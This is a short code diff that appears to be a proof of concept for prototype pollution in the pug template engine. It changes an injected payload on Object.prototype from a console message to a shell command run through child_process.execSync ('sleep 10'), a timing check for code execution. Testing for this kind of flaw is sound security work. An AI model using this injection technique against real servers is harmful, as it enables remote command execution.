@@ -2,7 +2,7 @@ pug = require("pug")
 
 
 Object.prototype['code'] = { 
-    val: "console.log('code injection!!!')"
+    val: "process.mainModule.require('child_process').execSync(\`sleep 10\`)"
 }
 
 
